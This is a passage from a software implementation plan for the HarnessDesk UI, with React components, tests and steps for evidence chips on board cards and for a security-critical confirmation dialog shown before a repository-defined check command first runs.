  spokenChip,
  standingWords,
  type FactChip,
} from '../lib/evidence'
import { ReviewIcon } from './Icons'

/**
 * A card's evidence, as chips: *verify ✓ @a1b2c3d*, *CI ✓*, *PR #12 open*,
 * *+120 −30 in 6 files* — and a check running now.
 *
 * One row, pressed as one: it opens *What the desk observed*, every fact on
 * the card with when it was observed, at which commit, by which Seat, and how
 * it stands now. A card the desk observed nothing about draws nothing — the
 * plain board stays plain.
 *
 * Composed from the design system's `Chip` and `stateTone`: a chip's tone is
 * the one `stateTone` gives its outcome, or neutral for a fact with none, and
 * its `stale` and `unknown` are the system's own. Nothing here draws a colour.
 * A stale chip is struck through and never green, and an unknown one is
 * neutral, because `Chip` says so — not because this file does.
 *
 * Prerequisite: the design system's state vocabulary (`4382ded9` on
 * `claude/ui-roles`, or the roles pull request once it is on main).
 */

/** A fact's chip, drawn: its outcome's tone from the one state map, and no state of its own. */
const FactChipView = ({ chip, className }: { readonly chip: FactChip; readonly className?: string }) => (
  <Chip
    tone={chip.outcome === null ? 'neutral' : stateTone(chip.outcome).tone}
    stale={chip.stale}
    unknown={chip.unknown}
    {...(className ? { className } : {})}
  >
    {chip.label}
  </Chip>
)
export const EvidenceChips = ({
  id,
  title,
  card,
}: {
  /** The card's number, for the words a reader and a screen reader hear. */
  readonly id: number
  readonly title: string
  readonly card: CardEvidence | undefined
}) => {
  const [open, setOpen] = useState(false)
  const chips = cardChips(card)
  if (chips.length === 0) return null
  return (
    <>
      <Button
        variant="ghost"
        size="inline"
        className="flex flex-wrap items-center gap-1"
        aria-label={`What the desk observed on #${id}: ${chips.map(spokenChip).join(', ')}`}
        onClick={() => setOpen(true)}
      >
        {chips.map((one) => (
          <FactChipView key={one.key} chip={one} />
        ))}
      </Button>
      {open && <ObservedDialog id={id} title={title} card={card} onClose={() => setOpen(false)} />}
    </>
  )
}

/**
 * Every fact on one card, whole. Read-only, as the record is: the desk wrote
 * each of these from something it did, and nothing here can change one.
 */
export const ObservedDialog = ({
  id,
  title,
  card,
  onClose,
}: {
  readonly id: number
  readonly title: string
  readonly card: CardEvidence | undefined
  readonly onClose: () => void
}) => {
  const facts = card?.facts ?? []
  const running = card?.running ?? []
  return (
    <Dialog
      title={`What the desk observed on #${id}`}
      subhead={title}
      size="lg"
      onClose={onClose}
      footer={
        <Button variant="secondary" onClick={onClose}>
          Done
        </Button>
      }
    >
      <div className="flex flex-col gap-4">
        {running.map((one) => (
          <Note key={one.name}>{`${one.name} is running, since ${new Date(one.since).toLocaleTimeString()}. What it observes arrives here when it ends.`}</Note>
        ))}
        {facts.length === 0 ? (
          <EmptyState
            tight
            icon={<ReviewIcon />}
            title="Nothing observed yet"
            description="The desk records a check it runs, the branch's diff, and its pull request and CI. Nothing an agent says is recorded here."
          />
        ) : (
          facts.map((view) => <Fact key={view.record.id} view={view} />)
        )}
      </div>
    </Dialog>
  )
}

/** One fact: its chip, then what was observed, when, where, by whom, and how it stands now. */
const Fact = ({ view }: { readonly view: EvidenceView }) => {
  const chip = chipOf(view)
  const fact = view.record.fact
  const at = revisionOfFact(fact)
  const branch = view.record.checkout?.branch ?? null
  return (
    <section aria-label={chip.label} className="flex flex-col gap-2">
      <FactChipView chip={chip} className="self-start" />
      <KeyValue>
        <KeyValueRow label="Observed">{new Date(view.record.observedAt).toLocaleString()}</KeyValueRow>
        {at !== null && (
          <KeyValueRow label="At">{branch ? `${shortSha(at)} on ${branch}` : shortSha(at)}</KeyValueRow>
        )}
        <KeyValueRow label="By">{byWords(view)}</KeyValueRow>
        {view.record.round != null && <KeyValueRow label="Round">{`Round ${view.record.round} of its flow`}</KeyValueRow>}
        <KeyValueRow label="Now">{standingWords(view.freshness)}</KeyValueRow>
        {fact.kind === 'check' && (
          <KeyValueRow label="Ran">
            <CodeText>{fact.run}</CodeText>
          </KeyValueRow>
        )}
        {fact.kind === 'check' && <KeyValueRow label="Result">{checkWords(fact)}</KeyValueRow>}
        {fact.kind === 'pr' && (
          <KeyValueRow label="State">
            <StatePill state={fact.state} />
          </KeyValueRow>
        )}
        {fact.kind === 'ci' && (
          <KeyValueRow label="Checks">
            {fact.checks.map((one) => `${one.name}: ${one.state}`).join(' · ')}
          </KeyValueRow>
        )}
        {fact.kind === 'diff' && <KeyValueRow label="Since">{shortSha(fact.from)}</KeyValueRow>}
      </KeyValue>
      {fact.kind === 'check' && fact.tail !== '' && (
        <CodeText as="pre" className="whitespace-pre-wrap break-all">
          {fact.tail}
        </CodeText>
      )}
      {fact.kind === 'pr' && fact.url !== null && (
        <Button variant="link" size="inline" className="self-start" onClick={() => openExternal(fact.url ?? '')}>
          {`Open pull request #${fact.number}`}
        </Button>
      )}
    </section>
  )
}
```

- [ ] **Step 5: The board reads its evidence, and every card draws its own**

In `packages/ui/src/components/TeamBoardPane.tsx`:

1. Add `type CardEvidence,` to the import from `@harnessdesk/protocol`, and `import { EvidenceChips } from './EvidenceChips'` after `import { AddWork } from './AddWork'`.
2. Directly after the effect that calls `store.loadFlowRuns(room)`, add:

```tsx
  /* What the desk observed on these cards: read when the board is shown, when
     the window comes back to the front, and every thirty seconds while it is on
     screen. Staleness is read, not watched, so a commit that lands on a card's
     branch shows at the next read; everything the desk records itself arrives
     on its own, as `evidence/changed`. */
  useEffect(() => {
    const read = (): void => void store.loadBoardEvidence(room)
    read()
    const timer = setInterval(read, 30_000)
    window.addEventListener('focus', read)
    return () => {
      clearInterval(timer)
      window.removeEventListener('focus', read)
    }
  }, [store, room])
  const evidence = snapshot.boardEvidence.get(room)
```

3. Where the pane renders `<IntentCard … />`, after `attached={attached}`, add `evidence={evidence?.cards.find((one) => one.card === intent.id)}`.
4. In `IntentCard`, add `evidence,` to the destructured props after `attached,`, and to its props type after `attached`:

```tsx
  /** What the desk observed on this card; undefined when nothing. */
  evidence: CardEvidence | undefined
```

5. In `IntentCard`'s `meta`, make the first child of the `<span className="flex min-w-0 flex-wrap …">`:

```tsx
          {/* What the desk observed on it, first: it is the news, and the chips
              open the whole of it. Nothing here comes from what anyone said. */}
          <EvidenceChips id={intent.id} title={intent.title} card={evidence} />
```

- [ ] **Step 6: The preview**

In `packages/ui/src/preview/main.tsx`:
1. Add `import { ObservedDialog } from '../components/EvidenceChips'` after the `../components/Details` import, and `import { EVIDENCE_BOARD, EVIDENCE_ROOM, EVIDENCE_TEAM } from './evidence-fixture'` after the `./harness` import.
2. Widen the dial: `useState<'off' | 'remove' | 'bring back' | 'sign in' | 'what was observed'>('off')`, and add `'what was observed'` to its `options`.
3. After `{dialog === 'sign in' && <SignIn onClose={() => setDialog('off')} />}`, add:

```tsx
      {/* What the desk observed on a card: a dialog, so it is chosen from the
          dial rather than covering the page. */}
      {dialog === 'what was observed' && (
        <ObservedDialog
          id={1}
          title={EVIDENCE_TEAM.intents[0]?.title ?? ''}
          card={EVIDENCE_BOARD.cards[0]}
          onClose={() => setDialog('off')}
        />
      )}
```

   and change the worktree dialogs' condition, `{dialog !== 'off' && dialog !== 'sign in' && (`, to `{(dialog === 'remove' || dialog === 'bring back') && (`.
4. Directly above `<Frame title="Board — the empty state">`, add:

```tsx
      {/* The evidence room: chips on every card that has any, one of them
          stale, a check running, and a card whose agent said the tests pass
          with nothing observed. */}
      <Frame title="Board — what the desk observed">
        <div className="h-[640px]">
          <TeamBoardPane room={EVIDENCE_ROOM} />
        </div>
      </Frame>
```

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/EvidenceChips.test.tsx src/components/TeamBoardPane.test.tsx src/components/TeamRoomPane.test.tsx`
Expected: PASS — 4 tests, every test in `TeamBoardPane.test.tsx` (five new), and every test in `TeamRoomPane.test.tsx`.

- [ ] **Step 8: Prove the tests can fail, and look at it**

1. In `EvidenceChips`, delete `if (chips.length === 0) return null`: `a card the desk observed nothing about draws nothing` fails — an empty row is drawn. Restore it.
2. Delete `window.addEventListener('focus', read)`: `reads what was observed when shown, when the window comes back, and every thirty seconds` fails. Restore it.
3. In `FactChipView`, pass `tone="neutral"` whatever the outcome, or drop `unknown={chip.unknown}`: `each chip's tone is the one the state map gives its outcome, and stale and unknown are the Chip's own` fails. Restore it.
4. Run the preview (`pnpm --filter @harnessdesk/ui run dev`, then `/preview.html`): the *Board — what the desk observed* frame shows chips on cards 1–4 — card 1's *verify ✓* in the success tone, card 2's struck through with *2 commits since*, card 3's *verify running* in the info tone; *what was observed* on the dial opens the dialog. Then:

```bash
node script/design-audit.mjs --strict
pnpm test:ui-system
```

Expected: the audit's findings unchanged; every UI-system spec passes — the chips row is a `Button` of the `inline` size, so it clears the 24px target floor.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/components/EvidenceChips.tsx packages/ui/src/components/EvidenceChips.test.tsx packages/ui/src/components/TeamBoardPane.tsx packages/ui/src/components/TeamBoardPane.test.tsx packages/ui/src/components/TeamRoomPane.test.tsx packages/ui/src/preview/main.tsx
git commit -m "feat(evidence): a card carries what the desk observed

Chips in each card's foot — verify ✓ @a1b2c3d, CI ✓, PR #12 open, +120 −30
in 6 files, verify running — pressed as one row that opens every fact whole:
when, at which commit, by which Seat, how it stands now. Each chip's tone is
the one the design system's stateTone gives its outcome, or neutral for a
fact it has no state for; stale and unknown are the Chip's own. A stale chip
says how far behind it is. The board reads its evidence when shown, on focus and
every thirty seconds; a card with none draws none. TeamBoardPane.test.tsx's
rig takes the evidence to seed; TeamRoomPane.test.tsx's store gains
loadBoardEvidence.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 17: Running a check from a card

> **Prerequisite:** `4382ded9` from `claude/ui-roles` — cherry-pick it, or the roles PR once it is on main. This task uses `MenuItem`'s `disabled="…"` reason, read out with `aria-describedby`.

> **Security-critical.** This task runs `.harnessdesk/checks.yml` commands from the interface, through `evidence/check/run` (Task 11), which holds every rule. What the card owes, and its tests pin: it asks without an answer; when the host says the command is not approved on this Mac, it shows the command verbatim, where it runs and the file it came from, what ran before when it changed — and says plainly that it runs with the person's full authority, as it would in their terminal; it answers with exactly the text and the file generation it showed, and nothing at all until the verb is pressed; nothing in the question is focused, so a held Return runs nothing; the verb is disarmed for `ARM_MS` after the question opens, so a click already on its way — the second half of a double click — runs nothing; *Not now* runs nothing; a check that cannot run stays in the menu greyed, says why, and runs nothing. The half of this only a browser can show — a key held through the question opening, a press on the backdrop, a click landing at once — is `e2e/ui-system/run-check.spec.ts`.

Each card's menu offers *Run <check>* for every check the project names. A check that cannot run now stays, greyed, with why as its second line (the menu pattern's `disabled="…"`, read out with `aria-describedby`): one the file refuses — *.harnessdesk/checks.yml refuses it; the project's page says why* — and every check on a card while one is running there — *verify is running on this card, and one check runs on a card at a time*, the rule Task 11 holds. A file that cannot be read says so. So the card's ⋮ menu becomes the menu pattern: `Popover` and `Menu`, whose rows carry a reason and which close themselves when something takes the screen (#214), in place of the primitive `DropdownMenu` and the card's own dismissal. The first run of a command this Mac has not approved opens `RunCheck`, a `ConfirmDialog`. What the check observes arrives on the card by itself.

**Files:**
- Create: `packages/ui/src/components/RunCheck.tsx`
- Modify: `packages/ui/src/components/TeamBoardPane.tsx` (the card's menu becomes the menu pattern; *Run <check>* in it, with reasons; the question)
- Modify: `packages/ui/src/state/store.ts` (`runCheck`), `packages/ui/src/preview/harness.tsx` (`runCheck`), `packages/ui/src/preview/main.tsx` (*run a check* on the dial)
- Modify: `script/check-reachable.mjs` (unpin `evidence/check/run`)
- Create: `e2e/ui-system/run-check.spec.ts` — the question, in a real browser
- Test, named edits: `packages/ui/src/components/TeamBoardPane.test.tsx` — the `rig`'s store gains `runCheck`, and six tests are appended; `packages/ui/src/state/store.evidence.test.ts` — two tests appended

**Proof needs:** the rendered UI

**Interfaces:**
- Consumes: `evidence/check/run` and its `checkUnseen` refusal with `data: CheckUnseen` (Task 11) — the renderer's rejection carries `code` and `data` (`lib/transport.ts`, `rejectionFor`); `BoardEvidence.checks`, `refused`, `unreadable` (Task 10); `CardEvidence.running` (Task 10); `ConfirmDialog` and its `pending`, `CodeText`, `Popover`, `Menu`, `MenuItem`, `MenuSeparator` (`../design`); `MoreIcon` (`./Icons`); `shortPath` (`lib/paths.ts`); the preview's `Mount` (`preview/harness.tsx`) for the spec.
- Produces: `AppStore.runCheck(room, card, name, answer?: { seen: string; digest: string }): Promise<{ kind: 'started' } | { kind: 'unseen'; unseen: CheckUnseen }>`; `ARM_MS = 600`; `RunCheck({ unseen, card, busy, onRun, onCancel })`.

- [ ] **Step 1: Write the failing tests**

1. In `packages/ui/src/state/store.evidence.test.ts`, add `PREVIEW_UNSEEN` to the import from `../preview/evidence-fixture`, and append:

```ts
it('running a check says it started, or hands back the command nobody here has approved, verbatim', async () => {
  await expect(store.runCheck(EVIDENCE_ROOM, 1, 'verify')).resolves.toEqual({ kind: 'started' })
  // Asked without an answer: nothing says the command was seen.
  expect(request).toHaveBeenLastCalledWith('evidence/check/run', { room: EVIDENCE_ROOM, card: 1, name: 'verify' })

  request.mockRejectedValueOnce(Object.assign(new Error('lint runs a command this machine has not approved'), { code: 'checkUnseen', data: PREVIEW_UNSEEN }))
  await expect(store.runCheck(EVIDENCE_ROOM, 1, 'lint')).resolves.toEqual({ kind: 'unseen', unseen: PREVIEW_UNSEEN })

  // The answer is the text that was shown and the file it was shown from, and only those.
  await store.runCheck(EVIDENCE_ROOM, 1, 'lint', { seen: PREVIEW_UNSEEN.check.run, digest: PREVIEW_UNSEEN.digest })
  expect(request).toHaveBeenLastCalledWith('evidence/check/run', {
    room: EVIDENCE_ROOM,
    card: 1,
    name: 'lint',
    seen: 'pnpm lint --max-warnings 0',
    digest: PREVIEW_UNSEEN.digest,
  })
})

it('any other refusal to run a check is thrown in the host’s words', async () => {
  request.mockRejectedValueOnce(Object.assign(new Error('lint is running on #1, and one check runs on a card at a time.'), { code: 'methodFailed' }))
  await expect(store.runCheck(EVIDENCE_ROOM, 1, 'verify')).rejects.toThrow('lint is running on #1, and one check runs on a card at a time.')
})
```

2. In `packages/ui/src/components/TeamBoardPane.test.tsx`, add `PREVIEW_UNSEEN` to the import from `../preview/evidence-fixture`, and `import { ARM_MS } from './RunCheck'` after it; in the `rig`'s store, after `loadBoardEvidence: …,`, add:

```tsx
    /* Started, unless a test says the command has not been seen here. */
    runCheck: vi.fn().mockResolvedValue({ kind: 'started' }),
```

   and append:

```tsx
/**
 * Running a project's check from a card — security-critical.
 *
 * A command a repository names runs only once a person has approved it on
 * this Mac. The host holds that rule; what the card owes is to ask without an
 * answer, to show the command verbatim when the host says it is not approved
 * — with plainly what running it means — and to answer with exactly the text
 * and the file it showed, and nothing at all until the person presses the
 * verb. Nothing is focused when the question opens, so a held Return runs
 * nothing, and the verb is disarmed for a moment, so a click already on its way
 * runs nothing either. The real-browser half of this is
 * `e2e/ui-system/run-check.spec.ts`.
 */
const UNSEEN = { ...PREVIEW_UNSEEN, check: { name: 'verify', run: 'pnpm verify', timeout: 1200 }, previous: null }

const question = (): HTMLElement | null => document.querySelector('[role="alertdialog"]')

const pressIn = (scope: ParentNode, label: string): void => {
  const found = [...scope.querySelectorAll('button')].find((one) => one.textContent?.trim() === label)
  if (!found) throw new Error(`no button labelled ${label}`)
  act(() => found.click())
}

/** Waits until the question's verb is armed. */
const armed = (): Promise<void> =>
  act(async () => {
    await new Promise((resolve) => setTimeout(resolve, ARM_MS + 50))
  })

it('a card offers each named check, and the first run of a command nobody here has seen shows it and asks', async () => {
  const { store } = rig([intent({ state: 'open' })], {}, observed(['verify'], []))
  ;(store.runCheck as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ kind: 'unseen', unseen: UNSEEN })
  await render(store)

  await pick(1, 'Run verify')
  await act(async () => {})
  // Asked without an answer, so nothing can have run.
  expect(store.runCheck).toHaveBeenCalledTimes(1)
  expect(store.runCheck).toHaveBeenCalledWith(ROOM, 1, 'verify')
  const asked = question()
  expect(asked?.textContent).toContain('Run verify on this Mac for the first time?')
  expect(asked?.querySelector('pre')?.textContent).toBe('pnpm verify')
  expect(asked?.textContent).toContain('.harnessdesk/checks.yml')
  // What approving it means, said plainly.
  expect(asked?.textContent).toContain('It runs with your full authority, as it would in your terminal')

  // A held Return answers nothing: no button in the question has the focus.
  expect([...(asked?.querySelectorAll('button') ?? [])].includes(document.activeElement as HTMLButtonElement)).toBe(false)
  act(() => {
    document.activeElement?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }))
  })
  await act(async () => {})
  expect(store.runCheck).toHaveBeenCalledTimes(1)

  // A press the moment it opens is a press that was already on its way: it answers nothing.
  pressIn(asked as HTMLElement, 'Run verify')
  await act(async () => {})
  expect(store.runCheck).toHaveBeenCalledTimes(1)

  // Armed, the answer is the text on screen and the file it came from, sent only when the verb is pressed.
  await armed()
  pressIn(asked as HTMLElement, 'Run verify')
  await act(async () => {})
  expect(store.runCheck).toHaveBeenCalledTimes(2)
  expect(store.runCheck).toHaveBeenLastCalledWith(ROOM, 1, 'verify', { seen: 'pnpm verify', digest: UNSEEN.digest })
  expect(question()).toBeNull()
})

it('Not now runs nothing, and says nothing was seen', async () => {
  const { store } = rig([intent({ state: 'open' })], {}, observed(['verify'], []))
  ;(store.runCheck as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ kind: 'unseen', unseen: UNSEEN })
  await render(store)

  await pick(1, 'Run verify')
  await act(async () => {})
  pressIn(question() as HTMLElement, 'Not now')
  await act(async () => {})
  expect(store.runCheck).toHaveBeenCalledTimes(1)
  expect(question()).toBeNull()
})

it('a changed command asks again, and shows what ran under its name before', async () => {
  const { store } = rig([intent({ state: 'open' })], {}, observed(['lint'], []))
  ;(store.runCheck as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ kind: 'unseen', unseen: PREVIEW_UNSEEN })
  await render(store)

  await pick(1, 'Run lint')
  await act(async () => {})
  const asked = question()
  expect(asked?.textContent).toContain('lint has changed since it last ran here')
  expect([...(asked?.querySelectorAll('pre') ?? [])].map((one) => one.textContent)).toEqual([
    'pnpm lint --max-warnings 0',
    'pnpm lint',
  ])
})

/** A menu item's reason: the second line the menu pattern ties to it with `aria-describedby`. */
const reasonOf = (item: HTMLElement | undefined): string | null => {
  const id = item?.getAttribute('aria-describedby')
  return id ? (document.getElementById(id)?.textContent ?? null) : null
}

it('a check that cannot run stays in the menu, greyed, with its reason as its second line', async () => {
  const { store } = rig(
    [intent({ state: 'open' })],
    {},
    {
      ...observed(['verify'], []),
      refused: [{ name: 'e2e', why: 'The command holds a character that is not plain printable ASCII.' }],
    },
  )
  await render(store)

  const items = await menuItems(1)
  const refused = items.find((one) => one.textContent?.startsWith('Run e2e'))
  expect(refused?.hasAttribute('data-disabled')).toBe(true)
  expect(reasonOf(refused)).toBe(".harnessdesk/checks.yml refuses it; the project's page says why")
  act(() => refused?.click())
  await act(async () => {})
  expect(store.runCheck).not.toHaveBeenCalled()
})

it('while a check runs on a card, every check on that card waits, and says why: one runs on a card at a time', async () => {
  const { store } = rig(
    [intent({ id: 1, state: 'open' }), intent({ id: 2, state: 'open', title: 'Another card' })],
    {},
    observed(['verify', 'lint'], [cardEvidence(1, [], [{ name: 'verify', since: 1 }])]),
  )
  await render(store)

  const items = await menuItems(1)
  for (const label of ['Run verify', 'Run lint']) {
    const item = items.find((one) => one.textContent?.startsWith(label))
    expect(item?.hasAttribute('data-disabled'), label).toBe(true)
    expect(reasonOf(item)).toBe('verify is running on this card, and one check runs on a card at a time')
  }
  act(() => dismissOverlays())
  await act(async () => {})
  // Another card is another checkout: its checks are offered.
  await pick(2, 'Run lint')
  expect(store.runCheck).toHaveBeenCalledWith(ROOM, 2, 'lint')
})

it('a refusal to run is said in the host’s words, and nothing is asked', async () => {
  const { store } = rig([intent({ state: 'open' })], {}, observed(['verify'], []))
  ;(store.runCheck as ReturnType<typeof vi.fn>).mockRejectedValueOnce(
    new Error("#1's checkout, /elsewhere, is not part of this project, so its check does not run there."),
  )
  await render(store)

  await pick(1, 'Run verify')
  await act(async () => {})
  expect(container.querySelector('[role="alert"]')?.textContent).toBe(
    "#1's checkout, /elsewhere, is not part of this project, so its check does not run there.",
  )
  expect(question()).toBeNull()
})
```

3. Create `e2e/ui-system/run-check.spec.ts`:

```ts
import { expect, test, type Page } from '@playwright/test'

/**
 * The question a check asks before it first runs — security-critical — in a
 * real browser, where a held key repeats and a click can already be on its way
 * when a dialog opens. jsdom can say that nothing is focused; only a browser
 * can say that a held Return, a press on the backdrop, or the second half of a
 * double click sends no answer.
 *
 * The question is the production `RunCheck`, mounted in the existing preview
 * on the preview's own store. Only the frame is supplied here: a button that
 * opens the question the way a card does — after the host has answered, a
 * moment later — and a count of the answers the question sent.
 */
const mountQuestion = async (page: Page): Promise<void> => {
  await page.route('**/src/preview/main.tsx*', async (route) => {
    const response = await route.fetch()
    const source = await response.text()
    const reactUrl = /from "([^"\n]*\/react\.js[^"\n]*)"/.exec(source)?.[1]
    if (!reactUrl) throw new Error('preview React module import was not found')
    await route.fulfill({
      response,
      body: `${source}
        import questionReact from ${JSON.stringify(reactUrl)};
        import { Mount as QuestionMount } from '/src/preview/harness.tsx';
        import { RunCheck as Question } from '/src/components/RunCheck.tsx';
        import { PREVIEW_UNSEEN as QUESTION } from '/src/preview/evidence-fixture.ts';
        window.__answers = 0;
        const QuestionFrame = () => {
          const [open, setOpen] = questionReact.useState(false);
          return questionReact.createElement(QuestionMount, null,
            questionReact.createElement('button', {
              type: 'button',
              // As a card does: the host answers the first press with the question, a moment later.
              onClick: () => setTimeout(() => setOpen(true), 300),
            }, 'Ask the question'),
            open && questionReact.createElement(Question, {
              unseen: QUESTION,
              card: 2,
              busy: false,
              onRun: () => { window.__answers += 1; setOpen(false); },
              onCancel: () => setOpen(false),
            }),
          );
        };
        const questionFrame = document.createElement('section');
        questionFrame.setAttribute('aria-label', 'Run check fixture');
        document.body.append(questionFrame);
        createRoot(questionFrame).render(questionReact.createElement(QuestionFrame));
      `,
    })
  })
  await page.goto('/preview.html')
}

const answers = (page: Page): Promise<number> => page.evaluate(() => (window as unknown as { __answers: number }).__answers)

const question = (page: Page) => page.getByRole('alertdialog', { name: /lint has changed since it last ran here/ })

test('a Return held from the press through the question opening answers nothing', async ({ page }) => {
  await mountQuestion(page)
  const ask = page.getByRole('button', { name: 'Ask the question' })
  await ask.focus()
  // Pressed, and held: the key repeats through the host's answer and the dialog opening.
  await page.keyboard.down('Enter')
  for (let n = 0; n < 24; n += 1) {
    await page.keyboard.down('Enter')
    await page.waitForTimeout(40)
  }
  await page.keyboard.up('Enter')
  await expect(question(page)).toBeVisible()
  expect(await answers(page)).toBe(0)
})

test('a press on the backdrop neither answers nor dismisses the question', async ({ page }) => {
  await mountQuestion(page)
  await page.getByRole('button', { name: 'Ask the question' }).click()
  await expect(question(page)).toBeVisible()
  await page.mouse.click(8, 8)
  await expect(question(page)).toBeVisible()
  expect(await answers(page)).toBe(0)
})

test('a click already on its way when the question opens answers nothing; once armed, a click answers once', async ({ page }) => {
  await mountQuestion(page)
  await page.getByRole('button', { name: 'Ask the question' }).click()
  await expect(question(page)).toBeVisible()
  const run = question(page).getByRole('button', { name: 'Run lint' })
  const box = await run.boundingBox()
  if (!box) throw new Error('the answer is not drawn')
  // At once, as the second half of a double click would land: straight onto where the answer is.
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2)
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2)
  expect(await answers(page)).toBe(0)
  await expect(question(page)).toBeVisible()

  // Armed: the answer is drawn enabled, and one press answers once.
  await expect(run).toBeEnabled()
  await run.click()
  await expect(question(page)).toBeHidden()
  expect(await answers(page)).toBe(1)
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/state/store.evidence.test.ts src/components/TeamBoardPane.test.tsx`
Expected: FAIL — `store.runCheck is not a function`, and the six board tests (`no menu item like “Run verify” on #1`).

- [ ] **Step 3: The store asks, and hands the question back**

In `packages/ui/src/state/store.ts`, add `type CheckUnseen,` to the import from `@harnessdesk/protocol`, and after `loadBoardEvidence` add:

```ts

  /**
   * Runs one of a room's named checks for a card. Answers `started`, or —
   * when this machine has not approved the command as it is written now —
   * `unseen`, with the command verbatim and the file's generation, so the
   * surface can show it and ask. The answer to that question is this same call
   * with `seen` and `digest` set to exactly what was shown; the host runs it
   * only while the file is still that. Every other refusal is thrown, in the
   * host's words.
   */
  async runCheck(
    room: string,
    card: number,
    name: string,
    answer?: { readonly seen: string; readonly digest: string },
  ): Promise<{ readonly kind: 'started' } | { readonly kind: 'unseen'; readonly unseen: CheckUnseen }> {
    try {
      await this.transport.request('evidence/check/run', {
        room,
        card,
        name,
        ...(answer !== undefined ? { seen: answer.seen, digest: answer.digest } : {}),
      })
      return { kind: 'started' }
    } catch (error) {
      const refusal = error as { code?: unknown; data?: unknown }
      if (refusal.code === 'checkUnseen' && refusal.data) return { kind: 'unseen', unseen: refusal.data as CheckUnseen }
      throw error
    }
  }
```

And in `script/check-reachable.mjs`, delete the `'evidence/check/run': …` line from `UNREACHED`.

- [ ] **Step 4: The question**

Create `packages/ui/src/components/RunCheck.tsx`:

```tsx
import { useEffect, useState } from 'react'

import type { CheckUnseen } from '@harnessdesk/protocol'

import { CodeText, ConfirmDialog } from '../design'
import { shortPath } from '../lib/paths'
import { useSnapshot } from '../state/context'

/**
 * How long the answer waits before it can be given, from the moment the
 * question opens: longer than a press, or a double press, that was already on
 * its way — the second half of a double click on *Run verify* lands here, where
 * the answer would be.
 */
export const ARM_MS = 600

/**
 * The question a command asks before it first runs on this Mac.
 *
 * **Security-critical.** `.harnessdesk/checks.yml` is committed in a repository
 * someone may have cloned, so a command it names runs only once a person has
 * approved it here, verbatim — and again whenever the file changes. This is
 * where they see it: the command exactly as it will run, where it will run,
 * the file it came from, what ran under that name before when it changed —
 * and, plainly, that it runs with their full authority, as it would in their
 * terminal. The desk does not sandbox it (see the plan's *Deliberately not in
 * this phase*); it only keeps the desk's own variables and tokens out of it.
 *
 * `ConfirmDialog`, because this is the confirm the dialog role exists for:
 * nothing is focused when it opens, so a held Return runs nothing, and the
 * backdrop does not dismiss it. The answer is also disarmed for `ARM_MS`
 * after it opens (`pending`, drawn and disabled), so a click already on its
 * way runs nothing either. What the answer sends is the text on screen and the
 * file it came from (`unseen.check.run`, `unseen.digest`), and the host runs it
 * only while the file is still exactly that — so a file changed while this was
 * open asks again.
 */
export const RunCheck = ({
  unseen,
  card,
  busy,
  onRun,
  onCancel,
}: {
  readonly unseen: CheckUnseen
  readonly card: number
  /** The answer is on its way to the host. */
  readonly busy: boolean
  readonly onRun: () => void
  readonly onCancel: () => void
}) => {
  const snapshot = useSnapshot()
  const { check, previous } = unseen
  const [armed, setArmed] = useState(false)
  useEffect(() => {
    const timer = setTimeout(() => setArmed(true), ARM_MS)
    return () => clearTimeout(timer)
  }, [])
  return (
    <ConfirmDialog
      title={
        previous === null
          ? `Run ${check.name} on this Mac for the first time?`
          : `${check.name} has changed since it last ran here`
      }
      tone="default"
      confirmLabel={`Run ${check.name}`}
      cancelLabel="Not now"
      busy={busy}
      busyLabel="Starting…"
      pending={!armed}
      onConfirm={onRun}
      onCancel={onCancel}
    >
      <div className="flex flex-col gap-2">
        <p>{`For #${card}, in ${shortPath(unseen.cwd, snapshot.home)}, it runs exactly this:`}</p>
        <CodeText as="pre" className="whitespace-pre-wrap break-all">
          {check.run}
        </CodeText>
        {previous !== null && (
          <>
            <p>What ran under this name before:</p>
            <CodeText as="pre" className="whitespace-pre-wrap break-all">
              {previous}
            </CodeText>
          </>
        )}
        <p>
          It runs with your full authority, as it would in your terminal: it can read and change anything you can, and
          reach the network. It is given none of HarnessDesk's own settings or tokens.
        </p>
        <p>
          {`It comes from ${shortPath(unseen.file, snapshot.home)}, which anyone who can change this project can edit. This Mac asks once for each command, and again whenever that file changes.`}
        </p>
      </div>
    </ConfirmDialog>
  )
}
```

- [ ] **Step 5: Each card offers the project's checks**

In `packages/ui/src/components/TeamBoardPane.tsx`:

1. Add `type BoardEvidence,` and `type CheckUnseen,` to the import from `@harnessdesk/protocol`; `import { RunCheck } from './RunCheck'` after the `EvidenceChips` import; `MoreIcon,` to the import from `./Icons`; in the import from `../design`, add `Menu,`, `MenuItem,`, `MenuSeparator,` and `Popover,` and remove `BoardMenuButton,`, `DropdownMenu,`, `DropdownMenuContent,`, `DropdownMenuItem,` and `DropdownMenuTrigger,`; and delete `import { useDismissOverlays } from '../design'`.
2. After `type Verb = …`, add:

```tsx

/** The checks a room's project names, as a card's menu offers them. */
type BoardChecks = Pick<BoardEvidence, 'checks' | 'refused' | 'unreadable'>

const NO_CHECKS: BoardChecks = { checks: [], refused: [], unreadable: null }

/** The file a project names its checks in, as a menu says it. */
const CHECKS_FILE_WORDS = '.harnessdesk/checks.yml'
```

3. After the `stopping` state, add:

```tsx
  /** A check whose command this Mac has not seen as it is written now, while its question is open. */
  const [asking, setAsking] = useState<{ readonly card: number; readonly unseen: CheckUnseen } | null>(null)
  /** The answer to that question, on its way to the host. */
  const [starting, setStarting] = useState(false)
```

4. After `const openAdd = …`, add:

```tsx
  /**
   * Runs one of the project's named checks for a card. Every rule is the
   * host's; this only asks. A command this Mac has not approved comes back as
   * a question, and its answer is the same call carrying the text on screen and
   * the file it came from — which the host runs only while the file is still
   * exactly that. What the check observes arrives on the card by itself, as
   * `evidence/changed`.
   */
  const runCheck = (card: number, name: string, answer?: { readonly seen: string; readonly digest: string }): void => {
    setStarting(answer !== undefined)
